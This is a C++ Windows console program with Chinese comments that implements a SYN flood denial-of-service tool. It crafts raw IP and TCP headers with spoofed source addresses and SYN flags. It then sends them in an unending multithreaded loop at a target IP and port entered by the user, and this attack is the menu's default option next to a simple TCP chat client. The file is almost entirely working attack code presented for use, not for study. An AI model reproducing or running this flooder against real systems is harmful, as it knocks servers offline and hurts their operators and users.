// client.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <winsock2.h>
#pragma comment (lib,"ws2_32")
#include <Ws2tcpip.h>
#include <conio.h>
#include <iostream>

using namespace std;

#define SEQ 0x28376839               //随机号码


int threadnum, maxthread;             //线程控制
int port;                            //目标端口
char DestIP[32];                        //目标IP


									 // 定义状态提示函数
void display(void)
{
	static int play = 0;


	// 进度条
	char *plays[12] =
	{
		" | ",
		" / ",
		" - ",
		" \\ ",
		" | ",
		" / ",
		" - ",
		" \\ ",
		" | ",
		" / ",
		" - ",
		" \\ ",
	};
	printf("=%s= %d threads \r", plays[play], threadnum);
	play = (play == 11) ? 0 : play + 1;
}


//定义一个tcphdr结构来存放TCP首部(9个成员,20字节)
typedef struct tcphdr
{
	USHORT th_sport;                    //16位源端口号
	USHORT th_dport;                    //16位目的端口号
	unsigned int th_seq;                //32位序列号
	unsigned int th_ack;                //32位确认号
	unsigned char th_lenres;            //4位首部长度+6位保留字中的4位
	unsigned char th_flag;              //6位标志位
	USHORT th_win;                      //16位窗口大小
	USHORT th_sum;                      //16位效验和
	USHORT th_urp;                      //16位紧急数据偏移量
}TCP_HEADER;


//定义一个iphdr来存放IP首部(10个成员,20字节)
typedef struct iphdr
{
	unsigned char h_verlen;              //4位首部长度，和4位IP版本号
	unsigned char tos;                   //8位类型服务
	unsigned short total_len;            //16位总长度
	unsigned short ident;                //16位标志
	unsigned short frag_and_flags;       //3位标志位（如SYN,ACK,等等)
	unsigned char ttl;                   //8位生存时间TTL
	unsigned char proto;                 //8位协议(TCP,UDP)
	unsigned short checksum;             //16位ip首部效验和
	unsigned int sourceIP;               //32位伪造IP地址
	unsigned int destIP;                 //32位攻击的ip地址
}IP_HEADER;


//TCP伪首部，用于进行TCP效验和的计算，保证TCP效验的有效性(5个成员,12字节)
struct
{
	unsigned long saddr;//源地址
	unsigned long daddr;                //目的地址
	char mbz;                           //置空
	char ptcl;                          //协议类型
	unsigned short tcpl;                //TCP长度
}PSD_HEADER;


//计算效验和函数，先把IP首部的效验和字段设为0(IP_HEADER.checksum=0)
//然后计算整个IP首部的二进制反码的和。
USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum = 0;
	while (size >1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size) cksum += *(UCHAR*)buffer;
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return (USHORT)(~cksum);
}


//synflood线程函数
DWORD WINAPI SynfloodThread(LPVOID lp)
{
	SOCKET  sock = NULL;
	int ErrorCode = 0, flag = true, TimeOut = 2000, FakeIpNet, FakeIpHost, dataSize = 0, SendSEQ = 0;
	struct        sockaddr_in sockAddr;
	TCP_HEADER  tcpheader;
	IP_HEADER   ipheader;
	char        sendBuf[128];


	//创建套接字
	sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);
	if (sock == INVALID_SOCKET)
	{
		printf("Socket failed: %d\n", WSAGetLastError());
		return 0;
	}


	//设置IP_HDRINCL以便自己填充IP首部
	ErrorCode = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(int));
	if (ErrorCode == SOCKET_ERROR)
	{
		printf("Set sockopt failed: %d\n", WSAGetLastError());
		return 0;
	}


	//设置发送超时
	ErrorCode = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&TimeOut, sizeof(TimeOut));
	if (ErrorCode == SOCKET_ERROR)
	{
		printf("Set sockopt time out failed: %d\n", WSAGetLastError());
		return 0;
	}


	//设置目标地址
	memset(&sockAddr, 0, sizeof(sockAddr));
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = inet_addr(DestIP);
	sockAddr.sin_port = htons(port);
	FakeIpNet = inet_addr("10.168.150.1");
	FakeIpHost = ntohl(FakeIpNet);


	//填充IP首部
	ipheader.h_verlen = (4 << 4 | sizeof(IP_HEADER) / sizeof(unsigned long));
	ipheader.total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER));
	ipheader.ident = 1;
	ipheader.frag_and_flags = 0;
	ipheader.ttl = 128;
	ipheader.proto = IPPROTO_TCP;
	ipheader.checksum = 0;
	ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
	ipheader.destIP = inet_addr(DestIP);


	//填充TCP首部
	tcpheader.th_sport = htons(7000);
	tcpheader.th_dport = htons(port);	
	tcpheader.th_seq = htonl(SEQ + SendSEQ);
	tcpheader.th_ack = 0;
	tcpheader.th_lenres = (sizeof(TCP_HEADER) / 4 << 4 | 0);
	tcpheader.th_flag = 2;
	tcpheader.th_win = htons(16384);
	tcpheader.th_urp = 0;
	tcpheader.th_sum = 0;


	//填充TCP伪首部
	PSD_HEADER.saddr = ipheader.sourceIP;
	PSD_HEADER.daddr = ipheader.destIP;
	PSD_HEADER.mbz = 0;
	PSD_HEADER.ptcl = IPPROTO_TCP;
	PSD_HEADER.tcpl = htons(sizeof(tcpheader));


	for (;;)
	{
		SendSEQ = (SendSEQ == 65536) ? 1 : SendSEQ + 1;
		//ip头
		ipheader.checksum = 0;
		ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
		//tcp头
		tcpheader.th_seq = htonl(SEQ + SendSEQ);
		//tcpheader.th_sport = htons(SendSEQ);
		tcpheader.th_sum = 0;
		//TCP伪首部
		PSD_HEADER.saddr = ipheader.sourceIP;


		//把TCP伪首部和TCP首部复制到同一缓冲区并计算TCP效验和
		memcpy(sendBuf, &PSD_HEADER, sizeof(PSD_HEADER));
		memcpy(sendBuf + sizeof(PSD_HEADER), &tcpheader, sizeof(tcpheader));
		tcpheader.th_sum = checksum((USHORT *)sendBuf, sizeof(PSD_HEADER) + sizeof(tcpheader));
		memcpy(sendBuf, &ipheader, sizeof(ipheader));
		memcpy(sendBuf + sizeof(ipheader), &tcpheader, sizeof(tcpheader));
		memset(sendBuf + sizeof(ipheader) + sizeof(tcpheader), 0, 4);
		dataSize = sizeof(ipheader) + sizeof(tcpheader);
		ipheader.checksum = checksum((USHORT *)sendBuf, dataSize);
		memcpy(sendBuf, &ipheader, sizeof(ipheader));
		int retSend = sendto(sock, sendBuf, dataSize, 0, (struct sockaddr*) &sockAddr, sizeof(sockAddr));
		if (retSend == SOCKET_ERROR)
		{
			int e = WSAGetLastError();
			printf("sendto failed: %d\n", WSAGetLastError());
			return 0;
		}
		
		display();
		//Sleep(2000);
	}




	InterlockedExchangeAdd((long *)&threadnum, -1);
	return 0;
}

void synFlood(int maxthread=8)
{
	int ErrorCode = 0;
	

	//如果线程数大于100则把线程数设置为100
	//maxthread = (maxthread>100) ? 100 : atoi(argv[3]);


	WSADATA wsaData;
	if ((ErrorCode = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0)
	{
		printf("WSAStartup failed: %d\n", ErrorCode);
		return ;
	}


	printf("[start]...........\nPress any key to stop!\n");


	//循环创建线程
	while (threadnum < maxthread)
	{
		if (CreateThread(NULL, 0, SynfloodThread, 0, 0, 0))
		{
			Sleep(10);
			threadnum++;
		}
	}

	Sleep(1000 * 500);
	WSACleanup();
	printf("\n[Stopd]...........\n");
}

void initialization() {
	//初始化套接字库
	WORD w_req = MAKEWORD(2, 2);//版本号
	WSADATA wsadata;
	int err;
	err = WSAStartup(w_req, &wsadata);
	if (err != 0) {
		cout << "初始化套接字库失败！" << endl;
	}
	else {
		cout << "初始化套接字库成功！" << endl;
	}
	//检测版本号
	if (LOBYTE(wsadata.wVersion) != 2 || HIBYTE(wsadata.wHighVersion) != 2) {
		cout << "套接字库版本号不符！" << endl;
		WSACleanup();
	}
	else {
		cout << "套接字库版本正确！" << endl;
	}
	//填充服务端地址信息
}
int normalConnect() {
	//定义长度变量
	int send_len = 0;
	int recv_len = 0;
	//定义发送缓冲区和接受缓冲区
	char send_buf[1024];
	char recv_buf[1024];
	//定义服务端套接字，接受请求套接字
	SOCKET s_server;
	//服务端地址客户端地址
	SOCKADDR_IN server_addr;
	initialization();
	//填充服务端信息
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.S_un.S_addr = inet_addr(DestIP);
	server_addr.sin_port = htons(port);
	//创建套接字
	s_server = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(s_server, (SOCKADDR *)&server_addr, sizeof(SOCKADDR)) == SOCKET_ERROR) {
		cout << "服务器连接失败！" << WSAGetLastError();
		WSACleanup();
		return 0;
	}
	else {
		cout << "服务器连接成功！" << endl;
	}

	//发送,接收数据
	while (1) {
		cout << "请输入发送信息:";
		cin.getline(send_buf, sizeof(send_buf));
		send_len = send(s_server, send_buf, 100, 0);
		if (send_len < 0) {
			cout << "发送失败！" << GetLastError() << endl;
			break;
		}
		recv_len = recv(s_server, recv_buf, 100, 0);
		if (recv_len < 0) {
			cout << "接受失败！" << GetLastError() << endl;
			break;
		}
		else {
			recv_buf[recv_len] = 0;
			cout << "服务端信息:" << recv_buf << endl;
		}

	}
	//关闭套接字
	closesocket(s_server);
	//释放DLL资源
	WSACleanup();
	return 0;
}


//使用帮助
void usage()
{
	printf("\t===================SYN Flood======================\n");
	printf("\t1.普通连接\n");
	printf("\t2.执行syn攻击\n");
}
int main(int argc, char* argv[])
{
	char input_buf[128] = { 0 };
	
	cout << "输入服务器IP：";
	cin >> input_buf;
	strcpy_s(DestIP, sizeof(DestIP), input_buf);

	cout << "输入端口：";
	cin >> input_buf;
	port = atoi(input_buf);

	

	usage();
	cin >> input_buf;

	switch (input_buf[0])
	{
	case '1':
	{
		normalConnect();
	}break;

	case '2':
	default:
	{
		synFlood();
	}break;
	}


	
	_getch();

	return 0;
}

